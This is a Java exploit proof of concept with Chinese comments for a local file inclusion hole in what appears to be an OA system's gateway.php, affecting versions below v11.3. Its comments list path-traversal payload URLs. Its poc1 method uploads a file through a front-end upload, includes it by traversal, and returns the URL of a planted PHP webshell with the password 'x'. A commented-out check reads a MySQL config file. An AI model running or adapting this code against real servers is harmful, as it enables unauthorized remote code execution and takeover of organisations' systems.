package com.xinyu.poc;

import com.xinyu.tools.Request;
import com.xinyu.tools.Response;

/**
 * 本地文件包含漏洞(已完成)
 */
public class LocalFileIncludes {
    /**
     * POC
     * /mac/gateway.php?json={}&url=../../nginx/logs/oa.access.log
     * /ispirit/interface/gateway.php?json={}&url=../../ispirit/../../nginx/logs/oa.access.log
     */

    /**
     * 包含上传文件(非web目录)
     * 影响版本:v11.3以下
     *
     * @param url
     * @return
     */
    public static String poc1(String url) {
        String shell_url = null;
//        //漏洞检测
//        String text = Request.get(url + "/mac/gateway.php?json={}&url=../../mysql5/my.ini").getText();
//        String text2 = Request.get(url + "/ispirit/interface/gateway.php?json={}&url=../../ispirit/../../mysql5/my.ini").getText();
//        if (text.contains("mysql") || text2.contains("mysql")) {
//            System.out.println("存在本地文件包含漏洞");
//        }

        //前台文件上传
        String[] fileArray = GetShell.poc4(url);
        if (fileArray != null) {
            String filePath = fileArray[0]; //上传文件路径
            String random_filename = fileArray[1]; //随机文件名
            String poc1 = url + "/mac/gateway.php?json={}&url=../.." + filePath; //低版本
            String poc2 = url + "/ispirit/interface/gateway.php?json={}&url=../../ispirit/../.." + filePath; //高版本

            //验证上传文件是否存在
            Response response = Request.get(poc1);
            if (response.getText().contains(random_filename)) {
                if (Request.get(url + "/" + random_filename + ".php").getText().contains(random_filename)) {
                    shell_url = url + "/" + random_filename + ".php\n密码:x";
                }
            } else {
                if (Request.get(poc2).getText().contains(random_filename)) {
                    if (Request.get(url + "/" + random_filename + ".php").getText().contains(random_filename)) {
                        shell_url = url + "/" + random_filename + ".php\n密码:x";
                    }
                }
            }
        }
        return shell_url;
    }

}
